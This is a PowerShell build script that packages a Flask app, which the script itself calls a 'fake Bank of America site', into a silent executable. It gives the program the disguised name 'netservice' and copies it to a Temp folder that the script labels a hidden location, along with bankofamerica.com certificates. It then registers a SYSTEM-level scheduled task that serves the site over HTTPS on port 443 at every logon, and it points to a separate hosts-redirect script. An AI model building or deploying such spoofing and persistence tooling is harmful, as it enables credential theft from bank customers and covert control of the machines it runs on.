#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Flask Bank App Builder
.DESCRIPTION
    Packages the fake Bank of America site into a standalone .exe
.PARAMETER Dev
    Enable dev mode (console window visible, Flask debug mode enabled)
#>

param(
    [switch]$Dev
)

# Configuration
$OutputName = "netservice"
$TaskName = "WebHostService"
$DeployDir = "$env:LOCALAPPDATA\Temp"

if ($Dev) {
    $DevMode = $true
    $ConsoleFlag = "--console"
    Write-Host "[DEV MODE ENABLED]"
    Write-Host ""
} else {
    $DevMode = $false
    $ConsoleFlag = "--noconsole"
}

Write-Host "========================================"
Write-Host "Building Flask Bank App"
Write-Host "========================================"
Write-Host ""

# ====================
# Check Required Files
# ====================
$requiredItems = @{
    "app.py" = "Application script"
    "templates" = "Templates directory"
    "static" = "Static files directory"
    "data" = "Data directory"
}

foreach ($item in $requiredItems.GetEnumerator()) {
    if (-not (Test-Path $item.Key)) {
        Write-Host "ERROR: $($item.Value) not found: $($item.Key)" -ForegroundColor Red
        Write-Host "Please run this script from the site directory."
        Read-Host "Press Enter to exit"
        exit 1
    }
}

# Check for SSL certificates (required for HTTPS)
$certFile = "bankofamerica.com+3.pem"
$keyFile = "bankofamerica.com+3-key.pem"

if (-not (Test-Path $certFile)) {
    Write-Host "ERROR: SSL certificates not found!" -ForegroundColor Red
    Write-Host "Please run setup_hosts_redirect.ps1 first to generate certificates."
    Read-Host "Press Enter to exit"
    exit 1
}

if (-not (Test-Path $keyFile)) {
    Write-Host "ERROR: SSL certificate key not found!" -ForegroundColor Red
    Write-Host "Please run setup_hosts_redirect.ps1 first to generate certificates."
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "SSL certificates found: $certFile" -ForegroundColor Green
Write-Host ""

# ====================
# Clean Previous Build
# ====================
Write-Host "Cleaning previous build..."

$itemsToClean = @(
    "dist\$OutputName.exe",
    "dist\.dev_mode",
    "build",
    "__pycache__"
)

foreach ($item in $itemsToClean) {
    if (Test-Path $item) {
        Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
    }
}
Write-Host ""

# ====================
# Build with PyInstaller
# ====================
Write-Host "Building $OutputName.exe..."
Write-Host "(This may take a few minutes...)"
Write-Host ""

$pyinstallerArgs = @(
    "--onefile",
    $ConsoleFlag,
    "--name", $OutputName,
    "--add-data", "templates;templates",
    "--add-data", "static;static",
    "--add-data", "data;data",
    "--hidden-import=flask",
    "--hidden-import=jinja2",
    "--collect-all", "flask",
    "--collect-all", "jinja2",
    "--noconfirm",
    "app.py"
)

pyinstaller @pyinstallerArgs

if ($LASTEXITCODE -ne 0) {
    Write-Host ""
    Write-Host "ERROR: PyInstaller build failed!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Verify the build
if (-not (Test-Path "dist\$OutputName.exe")) {
    Write-Host ""
    Write-Host "ERROR: dist\$OutputName.exe was not created!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host ""
Write-Host "Build successful: dist\$OutputName.exe" -ForegroundColor Green
Write-Host ""

# Create .dev_mode marker if in dev mode
if ($DevMode) {
    Write-Host "Creating .dev_mode marker..."
    "" | Out-File "dist\.dev_mode"
    Write-Host "Dev mode marker created at: dist\.dev_mode"
    Write-Host ""
} else {
    # Ensure no .dev_mode marker exists in production
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
    }
}

# ====================
# Deploy exe to hidden location
# ====================
Write-Host "Deploying to: $DeployDir\$OutputName.exe"

if (-not (Test-Path $DeployDir)) {
    New-Item -ItemType Directory -Path $DeployDir -Force | Out-Null
}

# Try to copy with retry logic (in case of file lock)
$retryCount = 0
$maxRetries = 5
$copied = $false

while (-not $copied -and $retryCount -lt $maxRetries) {
    try {
        Copy-Item "dist\$OutputName.exe" "$DeployDir\$OutputName.exe" -Force -ErrorAction Stop
        Write-Host "Deployment successful!" -ForegroundColor Green
        $copied = $true
    } catch {
        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Write-Host "File is locked, retrying in 2 seconds... (attempt $retryCount/$maxRetries)"
            Start-Sleep -Seconds 2
        } else {
            Write-Host ""
            Write-Host "ERROR: Could not deploy exe after $maxRetries attempts!" -ForegroundColor Red
            Write-Host "The file may still be locked by another process."
            Write-Host "Try manually stopping $OutputName.exe and running this script again."
            Write-Host ""
            Read-Host "Press Enter to exit"
            exit 1
        }
    }
}

# Copy SSL certificates to deployment directory (external to .exe)
Write-Host "Copying SSL certificates to deployment directory..."

try {
    Copy-Item $certFile "$DeployDir\$certFile" -Force
    Write-Host "Certificate copied: $certFile" -ForegroundColor Green
} catch {
    Write-Host "WARNING: Failed to copy certificate file!" -ForegroundColor Yellow
}

try {
    Copy-Item $keyFile "$DeployDir\$keyFile" -Force
    Write-Host "Certificate key copied: $keyFile" -ForegroundColor Green
} catch {
    Write-Host "WARNING: Failed to copy certificate key file!" -ForegroundColor Yellow
}

# Copy .dev_mode marker if in dev mode
if ($DevMode) {
    Copy-Item "dist\.dev_mode" "$DeployDir\.dev_mode" -Force
    Write-Host "Copied .dev_mode marker to deployment directory"
} else {
    # Clean up any existing .dev_mode marker in production
    if (Test-Path "$DeployDir\.dev_mode") {
        Remove-Item "$DeployDir\.dev_mode" -Force
    }
}

Write-Host ""

# ====================
# Install Task Scheduler Service
# ====================
Write-Host "========================================"
Write-Host "Installing Task Scheduler Service"
Write-Host "========================================"
Write-Host ""

# Delete existing task FIRST (so it doesn't auto-restart the process)
$taskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($taskExists) {
    Write-Host "Removing existing task: $TaskName"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Write-Host "Task removed successfully"
}

# Now stop the process (won't auto-restart since task is deleted)
$process = Get-Process -Name $OutputName -ErrorAction SilentlyContinue

if ($process) {
    Write-Host "Stopping existing $OutputName.exe process..."
    Stop-Process -Name $OutputName -Force
    Write-Host "Waiting for file lock to release..."
    Start-Sleep -Seconds 5
}

# Create new task to run on startup
Write-Host "Creating Task Scheduler task: $TaskName"

$action = New-ScheduledTaskAction -Execute "$DeployDir\$OutputName.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

try {
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    Write-Host "Task created successfully!" -ForegroundColor Green
    Write-Host "Task will run at startup with highest privileges (required for port 443)"
    Write-Host ""
    
    Write-Host "Starting service now..."
    Start-ScheduledTask -TaskName $TaskName
    
    if ($?) {
        Write-Host "Service started successfully!" -ForegroundColor Green
    } else {
        Write-Host "WARNING: Failed to start service automatically." -ForegroundColor Yellow
        Write-Host "You may need to start it manually or reboot."
    }
} catch {
    Write-Host "WARNING: Failed to create Task Scheduler task!" -ForegroundColor Yellow
    Write-Host "You may need to run this script as Administrator."
}

Write-Host ""

# ====================
# Summary
# ====================
Write-Host "========================================"
Write-Host "Build Complete!"
Write-Host "========================================"
Write-Host ""
Write-Host "Executable: $DeployDir\$OutputName.exe"
Write-Host "Task Name:  $TaskName"
Write-Host ""

Write-Host "Deployed files:"
Write-Host "  - $DeployDir\$OutputName.exe"
Write-Host "  - $DeployDir\$certFile"
Write-Host "  - $DeployDir\$keyFile"
Write-Host ""

if ($DevMode) {
    Write-Host "[DEV MODE] Console window will be visible" -ForegroundColor Cyan
    Write-Host "[DEV MODE] Flask debug mode enabled" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "To test, run: $DeployDir\$OutputName.exe"
    Write-Host ""
} else {
    Write-Host "[PRODUCTION] Silent background execution" -ForegroundColor Green
    Write-Host "[PRODUCTION] Starts automatically on boot" -ForegroundColor Green
    Write-Host "[PRODUCTION] HTTPS enabled on port 443" -ForegroundColor Green
    Write-Host ""
    Write-Host "To start now, run: Start-ScheduledTask -TaskName '$TaskName'"
    Write-Host "To stop, run:      Stop-Process -Name '$OutputName' -Force"
    Write-Host "To uninstall, run: Unregister-ScheduledTask -TaskName '$TaskName' -Confirm:`$false"
    Write-Host ""
}

Read-Host "Press Enter to exit"

